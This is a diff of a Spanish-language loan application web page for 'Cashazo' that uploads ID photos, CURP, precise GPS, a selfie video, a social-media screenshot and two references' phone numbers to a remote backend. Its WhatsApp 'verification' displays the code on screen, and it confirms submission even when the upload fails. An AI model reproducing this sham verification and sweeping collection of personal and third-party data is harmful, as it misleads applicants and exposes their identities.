+        Un asesor de <strong>Cashazo</strong> te contactará próximamente para confirmarte tu tasa personalizada y los detalles de tu crédito. Al enviar esta solicitud, <strong>Cashazo acepta todas tus condiciones</strong> y se compromete a darte seguimiento personalizado.
+      </div>
+    </div>
+
+    <div class="btn-row" style="flex-direction:column">
+      <button class="btn btn-next" onclick="submitForm()" style="font-size:17px;padding:16px">✅ Enviar Solicitud</button>
+      <button class="btn btn-back" style="width:100%;margin-top:8px" onclick="prevStep()">← Atrás</button>
+    </div>
+  </div>
+
+  <!-- ÉXITO + RECIBO -->
+  <div class="step" id="stepSuccess">
+    <div class="success-page">
+      <div class="success-icon">🎉</div>
+      <div class="success-title">¡Solicitud Enviada!</div>
+      <div class="success-text">Tu solicitud ha sido recibida correctamente.</div>
+      
+      <div class="folio-box">
+        <div class="folio-label">Tu número de solicitud</div>
+        <div class="folio-num" id="folioNumber">CZ-XXXXXX</div>
+      </div>
+
+      <div style="background:#e0f2fe;border:2px solid #0284c7;border-radius:12px;padding:16px;margin-bottom:16px;text-align:center">
+        <div style="font-size:13px;color:#0c4a6e;line-height:1.8">
+          <strong>✅ Solicitud confirmada</strong><br>
+          Un asesor de Cashazo te contactará próximamente por WhatsApp para confirmar tu tasa y los detalles de tu crédito.
+        </div>
+      </div>
+
+      <!-- RECIBO IMPRIMIBLE -->
+      <div style="margin-bottom:16px" id="reciboSection">
+        <div style="font-weight:800;font-size:15px;margin-bottom:10px;color:#1a1a1a;text-align:left">🧾 Tu recibo de solicitud</div>
+        <div class="recibo" id="reciboDoc">
+          <!-- Logo en recibo -->
+          <div class="recibo-logo">
+            <div style="width:44px;height:44px;background:linear-gradient(135deg,#22c55e,#16a34a);border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:22px">💚</div>
+            <div>
+              <div class="recibo-logo-text">cashazo</div>
+              <div class="recibo-logo-sub">Crédito rápido y seguro · Ciudad Juárez, Chih.</div>
+            </div>
+          </div>
+          <div class="recibo-folio">
+            <div class="recibo-folio-label">Folio de solicitud</div>
+            <div class="recibo-folio-num" id="reciboFolio">CZ-XXXXXX</div>
+          </div>
+          <div class="recibo-row">
+            <span class="recibo-label">Solicitante</span>
+            <span class="recibo-val" id="reciboNombre">—</span>
+          </div>
+          <div class="recibo-row">
+            <span class="recibo-label">WhatsApp</span>
+            <span class="recibo-val" id="reciboWA">—</span>
+          </div>
+          <div class="recibo-row">
+            <span class="recibo-label">Monto solicitado</span>
+            <span class="recibo-val" id="reciboMonto">—</span>
+          </div>
+          <div class="recibo-row">
+            <span class="recibo-label">Destino del crédito</span>
+            <span class="recibo-val" id="reciboDestino">—</span>
+          </div>
+          <div class="recibo-row">
+            <span class="recibo-label">Fecha de solicitud</span>
+            <span class="recibo-val" id="reciboFecha">—</span>
+          </div>
+          <div class="recibo-stamp">✓ SOLICITUD RECIBIDA</div>
+        </div>
+      </div>
+
+      <div style="margin-top:20px">
+        <button class="btn btn-gray" onclick="printRecibo()" style="margin-bottom:10px">🖨 Imprimir recibo</button>
+        <button class="btn btn-next" onclick="location.reload()">↻ Hacer otra solicitud</button>
+      </div>
+    </div>
+  </div>
+
+</div>
+</div>
+
+<script>
+// ═══════════════════════════════════════
+// VARIABLES GLOBALES
+// ═══════════════════════════════════════
+const TOTAL_STEPS = 7;
+const WA_ADMIN = '6141234567'; // Reemplazar con tu número
+let currentStep = 1;
+let waCode = '';
+let waVerified = false;
+let locationData = null;
+let videoData = null;
+let recordedChunks = [];
+let mediaRecorder = null;
+let recordingStart = 0;
+let selectedAmount = null;
+
+// ═══════════════════════════════════════
+// PROGRESS BAR
+// ═══════════════════════════════════════
+function renderProgressBar() {
+  const bar = document.getElementById('progressBar');
+  bar.innerHTML = '';
+  for (let i = 1; i <= TOTAL_STEPS; i++) {
+    const div = document.createElement('div');
+    if (i < currentStep) div.className = 'done';
+    if (i === currentStep) div.className = 'active';
+    bar.appendChild(div);
+  }
+  document.getElementById('progressLabel').textContent = `Paso ${currentStep} de ${TOTAL_STEPS}`;
+}
+renderProgressBar();
+
+// ═══════════════════════════════════════
+// NAVEGACIÓN
+// ═══════════════════════════════════════
+function nextStep(step) {
+  if (!validate(step)) return;
+  goToStep(step + 1);
+}
+
+function prevStep() {
+  if (currentStep > 1) goToStep(currentStep - 1);
+}
+
+function goToStep(n) {
+  const current = document.getElementById(currentStep === TOTAL_STEPS + 1 ? 'stepSuccess' : 'step' + currentStep);
+  if (current) current.classList.remove('active');
+  currentStep = n;
+  const next = document.getElementById(n === TOTAL_STEPS + 1 ? 'stepSuccess' : 'step' + n);
+  if (next) next.classList.add('active');
+  renderProgressBar();
+  window.scrollTo(0, 0);
+  if (n === 2) document.getElementById('waDisplay').value = document.getElementById('whatsapp').value;
+  if (n === 5) initCamera();
+}
+
+// ═══════════════════════════════════════
+// VALIDACIÓN
+// ═══════════════════════════════════════
+function validate(step) {
+  const val = id => document.getElementById(id).value.trim();
+  const numOnly = s => s.replace(/\D/g, '');
+
+  if (step === 1) {
+    const nom = val('nombre');
+    const tel = numOnly(val('tel'));
+    const wa = numOnly(val('whatsapp'));
+    const curp = val('curp').toUpperCase();
+    if (!nom || nom.split(' ').length < 2) return showErr(1, 'Escribe tu nombre completo (nombre y apellidos)');
+    if (tel.length !== 10) return showErr(1, 'El teléfono debe tener 10 dígitos');
+    if (wa.length !== 10) return showErr(1, 'El WhatsApp debe tener 10 dígitos');
+    if (curp.length !== 18) return showErr(1, 'La CURP debe tener 18 caracteres');
+    return true;
+  }
+
+  if (step === 2) {
+    if (!waVerified) return showErr(2, 'Verifica tu WhatsApp antes de continuar');
+    return true;
+  }
+
+  if (step === 3) {
+    if (!locationData) return showErr(3, 'Primero obtén tu GPS');
+    if (!val('domicilio')) return showErr(3, 'Escribe tu domicilio');
+    return true;
+  }
+
+  if (step === 4) {
+    if (!document.getElementById('ineF').files.length) return showErr(4, 'Sube la foto del frente de tu INE');
+    if (!document.getElementById('ineR').files.length) return showErr(4, 'Sube la foto del reverso de tu INE');
+    if (!document.getElementById('recServ').files.length) return showErr(4, 'Sube un recibo de servicio (CFE, Telmex o agua)');
+    if (!document.getElementById('social').files.length) return showErr(4, 'Sube captura de tu perfil en redes sociales');
+    if (!document.getElementById('casa').files.length) return showErr(4, 'Sube foto de tu domicilio');
+    return true;
+  }
+
+  if (step === 5) {
+    if (!videoData) return showErr(5, 'Graba tu video de verificación (mínimo 5 segundos)');
+    return true;
+  }
+
+  if (step === 6) {
+    if (!selectedAmount) return showErr(6, 'Selecciona el monto que necesitas');
+    if (selectedAmount === 'otro' && !val('customAmount')) return showErr(6, 'Especifica el monto exacto');
+    if (!val('destino')) return showErr(6, 'Selecciona el destino del crédito');
+    if (!val('ocupacion')) return showErr(6, 'Especifica tu ocupación');
+    if (!val('ingresos')) return showErr(6, 'Indica tus ingresos mensuales');
+    return true;
+  }
+
+  if (step === 7) {
+    const r1n = val('ref1Name'); const r1t = numOnly(val('ref1Tel'));
+    const r2n = val('ref2Name'); const r2t = numOnly(val('ref2Tel'));
+    if (!r1n || r1t.length !== 10) return showErr(7, 'Referencia 1: nombre completo y teléfono de 10 dígitos');
+    if (!r2n || r2t.length !== 10) return showErr(7, 'Referencia 2: nombre completo y teléfono de 10 dígitos');
+    const allChks = ['chk1','chk2','chk3','chk4'].every(id => document.getElementById(id).checked);
+    if (!allChks) return showErr(7, 'Debes aceptar todos los puntos para continuar');
+    return true;
+  }
+
+  return true;
+}
+
+function showErr(step, msg) {
+  const el = document.getElementById('err' + step);
+  el.textContent = '⚠️ ' + msg;
+  el.style.display = 'block';
+  el.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+  setTimeout(() => { el.style.display = 'none'; }, 5000);
+  return false;
+}
+
+// ═══════════════════════════════════════
+// WHATSAPP — CÓDIGO VISIBLE EN PANTALLA
+// ═══════════════════════════════════════
+function sendWACode() {
+  waCode = Math.floor(100000 + Math.random() * 900000).toString();
+  const wa = document.getElementById('whatsapp').value.replace(/\D/g, '');
+  const btn = document.getElementById('btnSendCode');
+  
+  document.getElementById('codeVisible').textContent = waCode;
+  document.getElementById('waCodeDisplay').style.display = 'block';
+  btn.textContent = '✓ Código generado';
+  btn.disabled = true;
+
+  const badge = document.getElementById('waBadge');
+  badge.innerHTML = '⏳ Aguardando verificación...';
+  badge.className = 'badge pending';
+}
+
+function verifyWACode() {
+  const entered = document.getElementById('waCode').value.trim();
+  if (!entered || entered !== waCode) {
+    showErr(2, 'Código incorrecto. Verifica y vuelve a intentar');
+    return;
+  }
+  waVerified = true;
+  document.getElementById('err2').style.display = 'none';
+  
+  const badge = document.getElementById('waBadge');
+  badge.textContent = '✓ WhatsApp verificado';
+  badge.className = 'badge ok';
+  
+  document.getElementById('btn2Next').disabled = false;
+  document.getElementById('waCodeDisplay').style.display = 'none';
+  document.getElementById('btnSendCode').style.display = 'none';
+}
+
+// ═══════════════════════════════════════
+// GPS — MEJORADO
+// ═══════════════════════════════════════
+function getGPS() {
+  const btn = document.getElementById('btnGPS');
+  const box = document.getElementById('locBox');
+  btn.disabled = true;
+  btn.textContent = '⏳ Obteniendo GPS...';
+  box.className = 'loc-box';
+  box.innerHTML = '<div style="color:#6b7280">🛰️ Localizando tu posición...</div>';
+
+  // Timeout agresivo - 15 segundos
+  const gpsTimeout = setTimeout(() => {
+    handleGPSError({ code: 3, message: 'Timeout GPS' });
+  }, 15000);
+
+  navigator.geolocation.getCurrentPosition(
+    async (pos) => {
+      clearTimeout(gpsTimeout);
+      
+      locationData = {
+        lat: pos.coords.latitude,
+        lng: pos.coords.longitude,
+        acc: Math.round(pos.coords.accuracy)
+      };
+
+      // Calcular precisión - AJUSTADO
+      let precPct = Math.max(0, Math.min(100, Math.round(100 - (locationData.acc / 50))));
+      if (precPct > 100) precPct = 100;
+      
+      const precColor = precPct >= 70 ? '#22c55e' : precPct >= 40 ? '#f59e0b' : '#ef4444';
+      const precLabel = precPct >= 70 ? 'Buena' : precPct >= 40 ? 'Aceptable' : 'Baja';
+
+      // Intentar reversa geocodificación
+      let direccion = `${locationData.lat.toFixed(5)}, ${locationData.lng.toFixed(5)}`;
+      
+      try {
+        const resp = await Promise.race([
+          fetch(`https://nominatim.openstreetmap.org/reverse?lat=${locationData.lat}&lon=${locationData.lng}&format=json&zoom=18&addressdetails=1&accept-language=es`, { 
+            headers: { 'User-Agent': 'Mozilla/5.0' }
+          }),
+          new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 4000))
+        ]);
+        
+        if (resp.ok) {
+          const geo = await resp.json();
+          if (geo && geo.address) {
+            const a = geo.address;
+            const partes = [
+              a.road || a.street,
+              a.house_number,
+              a.neighbourhood || a.suburb || a.quarter,
+              a.city || a.town,
+              a.state
+            ].filter(Boolean);
+            
+            if (partes.length >= 2) {
+              direccion = partes.join(', ');
+            }
+          }
+        }
+      } catch (e) {
+        console.log('Geocodificación falló, usando coordenadas');
+      }
+
+      locationData.direccion = direccion;
+
+      // Mostrar GPS capturado (solo coordenadas que SÍ son correctas)
+      box.className = 'loc-box ok';
+      box.innerHTML = `
+        <div style="font-weight:700;margin-bottom:6px;color:#166534">✓ GPS Capturado</div>
+        <div style="font-size:13px;color:#166534;margin-bottom:10px;font-family:monospace;word-break:break-word">${locationData.lat.toFixed(6)}, ${locationData.lng.toFixed(6)}</div>
+        <div style="font-size:12px;color:#6b7280;margin-bottom:10px;font-weight:600">⚠️ Verifica que tu dirección sea correcta en el campo de abajo</div>
+        <div class="loc-precision">
+          <span style="font-size:12px;color:#6b7280">Precisión ${precPct}% · ${precLabel}</span>
+          <div class="precision-bar">
+            <div class="precision-fill" style="width:${precPct}%;background:${precColor}"></div>
+          </div>
+          <span style="font-size:11px;color:#6b7280">±${locationData.acc}m</span>
+        </div>
+      `;
+
+      // Habilitar botón para abrir Google Maps
+      document.getElementById('btnOpenMaps').style.display = 'block';
+
+      document.getElementById('btn3Next').disabled = false;
+      btn.disabled = false;
+      btn.textContent = '🔄 Actualizar GPS';
+    },
+    (err) => {
+      clearTimeout(gpsTimeout);
+      handleGPSError(err);
+      btn.disabled = false;
+      btn.textContent = '📍 Intentar de nuevo';
+    },
+    { 
+      enableHighAccuracy: true, 
+      timeout: 14000, 
+      maximumAge: 0 
+    }
+  );
+}
+
+function handleGPSError(err) {
+  const box = document.getElementById('locBox');
+  box.className = 'loc-box err';
+  
+  let msg = '';
+  if (err.code === 1 || err.code === 'PermissionDenied') {
+    msg = '✗ Permiso denegado. Ve a Configuración → Privacidad → Ubicación y activa GPS.';
+  } else if (err.code === 2 || err.code === 'PositionUnavailable') {
+    msg = '✗ Posición no disponible. Intenta en un lugar abierto con mejor señal satelital.';
+  } else if (err.code === 3 || err.message === 'Timeout') {
+    msg = '✗ Tiempo agotado. Asegúrate de tener GPS activado y vuelve a intentar.';
+  } else {
+    msg = '✗ Error al obtener GPS. Verifica que el GPS esté activado.';
+  }
+  
+  box.innerHTML = `<div style="color:#991b1b;font-weight:600">${msg}</div><div style="font-size:12px;color:#991b1b;margin-top:6px">Código: ${err.code || err.message}</div>`;
+}
+
+function openGoogleMaps() {
+  if (!locationData) {
+    alert('Primero captura tu GPS');
+    return;
+  }
+  const lat = locationData.lat;
+  const lng = locationData.lng;
+  
+  // URL que funciona en TODOS lados (mobile y desktop)
+  // Google Maps detecta el dispositivo automáticamente
+  const mapsUrl = `https://maps.google.com/maps?q=${lat},${lng}`;
+  
+  // Abre en ventana nueva
+  window.open(mapsUrl, '_blank');
+}
+
+// ═══════════════════════════════════════
+// DOCUMENTOS
+// ═══════════════════════════════════════
+function uploadDoc(input, type) {
+  if (!input.files[0]) return;
+  const reader = new FileReader();
+  reader.onload = (e) => {
+    const prev = document.getElementById('prev' + type);
+    const zone = document.getElementById('zone' + type);
+    if (prev) { prev.src = e.target.result; prev.classList.add('shown'); }
+    if (zone) zone.classList.add('filled');
+    checkDocs();
+  };
+  reader.readAsDataURL(input.files[0]);
+}
+
+function checkDocs() {
+  const all = ['ineF','ineR','recServ','social','casa'].every(id => document.getElementById(id).files.length);
+  document.getElementById('btn4Next').disabled = !all;
+}
+
+// ═══════════════════════════════════════
+// MONTO
+// ═══════════════════════════════════════
+function selectAmount(amt, el) {
+  selectedAmount = amt;
+  document.querySelectorAll('.amount-btn').forEach(b => b.classList.remove('selected'));
+  el.classList.add('selected');
+  
+  const customDiv = document.getElementById('customMonto');
+  if (amt === 'otro') {
+    customDiv.style.display = 'block';
+  } else {
+    customDiv.style.display = 'none';
+    document.getElementById('customAmount').value = '';
+  }
+}
+
+// ═══════════════════════════════════════
+// CÁMARA
+// ═══════════════════════════════════════
+function initCamera() {
+  const status = document.getElementById('camStatus');
+  navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true })
+    .then(stream => {
+      document.getElementById('videoStream').srcObject = stream;
+      status.textContent = '✓ Cámara lista · Centra tu cara y graba';
+      status.className = 'video-status ok';
+      document.getElementById('videoControls').style.display = 'block';
+      document.getElementById('videoControls').innerHTML = '<button class="btn btn-orange" onclick="startVideo()" style="margin-bottom:8px">⏺ Iniciar grabación</button>';
+    })
+    .catch(err => {
+      status.textContent = '✗ Sin acceso a cámara. Ve a Configuración y permite el acceso.';
+      status.className = 'video-status err';
+    });
+}
+
+function startVideo() {
+  const stream = document.getElementById('videoStream').srcObject;
+  recordedChunks = [];
+  mediaRecorder = new MediaRecorder(stream);
+  mediaRecorder.ondataavailable = e => recordedChunks.push(e.data);
+  mediaRecorder.start();
+  recordingStart = Date.now();
+  document.getElementById('videoControls').innerHTML = '<button class="btn btn-red" onclick="stopVideo()">⏹ Detener grabación</button>';
+  document.getElementById('camStatus').textContent = '🔴 Grabando... di tu nombre y solicita el crédito';
+  document.getElementById('camStatus').className = 'video-status err';
+}
+
+function stopVideo() {
+  if (!mediaRecorder) return;
+  if (Date.now() - recordingStart < 5000) {
+    alert('El video debe tener al menos 5 segundos');
+    return;
+  }
+  mediaRecorder.stop();
+  mediaRecorder.onstop = () => {
+    const blob = new Blob(recordedChunks, { type: 'video/webm' });
+    const url = URL.createObjectURL(blob);
+    document.getElementById('recordedVideo').src = url;
+    document.getElementById('recordedVideo').style.display = 'block';
+    videoData = blob;
+    document.getElementById('videoLive').classList.remove('active');
+    document.getElementById('camStatus').textContent = '¿El video está bien?';
+    document.getElementById('camStatus').className = 'video-status';
+    document.getElementById('videoControls').innerHTML = `
+      <button class="btn btn-next" onclick="acceptVideo()" style="margin-bottom:8px">✓ Video correcto</button>
+      <button class="btn btn-gray" onclick="retryVideo()">↺ Grabar de nuevo</button>
+    `;
+  };
+}
+
+function acceptVideo() {
+  document.getElementById('btn5Next').disabled = false;
+  document.getElementById('videoControls').style.display = 'none';
+  document.getElementById('camStatus').textContent = '✓ Video aceptado';
+  document.getElementById('camStatus').className = 'video-status ok';
+}
+
+function retryVideo() {
+  document.getElementById('recordedVideo').style.display = 'none';
+  document.getElementById('videoLive').classList.add('active');
+  videoData = null;
+  document.getElementById('camStatus').textContent = 'Listo para grabar de nuevo';
+  document.getElementById('camStatus').className = 'video-status';
+  document.getElementById('videoControls').innerHTML = '<button class="btn btn-orange" onclick="startVideo()">⏺ Iniciar grabación</button>';
+}
+
+// ═══════════════════════════════════════
+// SUBMIT + JSON
+// ═══════════════════════════════════════
+function submitForm() {
+  if (!validate(7)) return;
+
+  const folio = 'CZ-' + Math.random().toString(36).substr(2, 8).toUpperCase();
+  const wa = document.getElementById('whatsapp').value.replace(/\D/g, '');
+  const nombre = document.getElementById('nombre').value;
+  const monto = selectedAmount === 'otro' ? document.getElementById('customAmount').value : selectedAmount;
+  const montoFmt = '$' + parseInt(monto).toLocaleString('es-MX') + ' MXN';
+  const destino = document.getElementById('destino').value;
+  const domicilioUsuario = document.getElementById('domicilio').value;  // LA DIRECCIÓN CORRECTA QUE EL USUARIO ESCRIBA
+  const ahora = new Date().toLocaleString('es-MX', { timeZone: 'America/Chihuahua', day:'2-digit', month:'2-digit', year:'numeric', hour:'2-digit', minute:'2-digit' });
+
+  // SOLICITUD JSON COMPLETA
+  const dataSolicitud = {
+    folio: folio,
+    timestamp: new Date().toISOString(),
+    solicitante: {
+      nombre: nombre,
+      telefono: document.getElementById('tel').value,
+      whatsapp: '+52' + wa,
+      email: document.getElementById('email').value,
+      curp: document.getElementById('curp').value.toUpperCase()
+    },
+    ubicacion: {
+      direccion: domicilioUsuario,
+      direccion_verificada: domicilioUsuario,
+      gps: locationData ? { 
+        lat: locationData.lat, 
+        lng: locationData.lng, 
+        precision_metros: locationData.acc 
+      } : null
+    },
+    credito: {
+      monto_solicitado: parseInt(monto),
+      monto_formateado: montoFmt,
+      destino: destino,
+      ocupacion: document.getElementById('ocupacion').value,
+      ingresos_mensuales: parseInt(document.getElementById('ingresos').value)
+    },
+    referencias: {
+      ref1: {
+        nombre: document.getElementById('ref1Name').value,
+        telefono: '+52' + document.getElementById('ref1Tel').value.replace(/\D/g, '')
+      },
+      ref2: {
+        nombre: document.getElementById('ref2Name').value,
+        telefono: '+52' + document.getElementById('ref2Tel').value.replace(/\D/g, '')
+      }
+    },
+    documentos: {
+      ine_frente: !!document.getElementById('ineF').files.length,
+      ine_reverso: !!document.getElementById('ineR').files.length,
+      recibo_servicio: !!document.getElementById('recServ').files.length,
+      perfil_social: !!document.getElementById('social').files.length,
+      foto_domicilio: !!document.getElementById('casa').files.length,
+      video_verificacion: !!videoData
+    },
+    aceptaciones: {
+      terminos_condiciones: document.getElementById('chk1').checked,
+      contacto_autorizado: document.getElementById('chk2').checked,
+      documentacion_verídica: document.getElementById('chk3').checked,
+      gps_verificacion: document.getElementById('chk4').checked
+    },
+    estado: 'pendiente_revisar',
+    fecha_solicitud: ahora
+  };
+
+  // LLENAR RECIBO
+  document.getElementById('folioNumber').textContent = folio;
+  document.getElementById('reciboFolio').textContent = folio;
+  document.getElementById('reciboNombre').textContent = nombre;
+  document.getElementById('reciboWA').textContent = '+52 ' + wa;
+  document.getElementById('reciboMonto').textContent = montoFmt;
+  document.getElementById('reciboDestino').textContent = destino;
+  document.getElementById('reciboFecha').textContent = ahora;
+
+  // GUARDAR EN VARIABLE GLOBAL PARA TU ADMIN/SERVIDOR
+  window.currentJSON = JSON.stringify(dataSolicitud, null, 2);
+
+  // ENVIAR AL SERVIDOR FINAL (Backend + Supabase + Email)
+  const formData = new FormData();
+  formData.append('dataSolicitud', JSON.stringify(dataSolicitud));
+  formData.append('folio', folio);
+
+  // Agregar archivos (si existen)
+  const archivos = [
+    { id: 'ineF', name: 'ine_frente' },
+    { id: 'ineR', name: 'ine_reverso' },
+    { id: 'recServ', name: 'recibo_servicio' },
+    { id: 'social', name: 'perfil_social' },
+    { id: 'casa', name: 'foto_domicilio' }
+  ];
+
+  archivos.forEach(({ id, name }) => {
+    const input = document.getElementById(id);
+    if (input && input.files.length > 0) {
+      formData.append(name, input.files[0]);
+    }
+  });
+
+  // Agregar video si existe
+  if (videoData) {
+    formData.append('video_verificacion', videoData, 'video.webm');
+  }
+
+  fetch('https://cashazo-backend-v1vr.onrender.com/api/solicitud', {
+    method: 'POST',
+    body: formData
+  })
+  .then(r => r.json())
+  .then(data => {
+    if (data.success) {
+      console.log('✅ Solicitud guardada + Email enviado:', data.folio);
+    }
+  })
+  .catch(e => console.log('⚠️ Error:', e));
+
+  goToStep(TOTAL_STEPS + 1);
+}
+
+function updateAceptacion() {
+  const chk = document.getElementById(id);
+  chk.checked = !chk.checked;
+  updateAceptacion();
+}
+
+function updateAceptacion() {
+  const chk1 = document.getElementById('chk1').checked;
+  const chk2 = document.getElementById('chk2').checked;
+  const chk3 = document.getElementById('chk3').checked;
+  const chk4 = document.getElementById('chk4').checked;
+  
+  // Cambiar color de cada fila según si está checked
+  document.getElementById('label1').style.backgroundColor = chk1 ? '#f0fdf4' : '#fff';
+  document.getElementById('label2').style.backgroundColor = chk2 ? '#f0fdf4' : '#fff';
+  document.getElementById('label3').style.backgroundColor = chk3 ? '#f0fdf4' : '#fff';
+  document.getElementById('label4').style.backgroundColor = chk4 ? '#f0fdf4' : '#fff';
+}
+
+function printRecibo() {
+  window.print();
+}
+</script>
+
+<style>
+@media print {
+  .header,.progress-wrap,.btn,.btn-row,.success-icon,.success-title,.success-text,.folio-box { display: none !important; }
+  body { background: white; }
+  .card { box-shadow: none; padding: 0; }
+  .step { display: none !important; }
+  #stepSuccess { display: block !important; }
+  .recibo { border: 2px solid #000; }
+}
+</style>
+</body>
+</html>
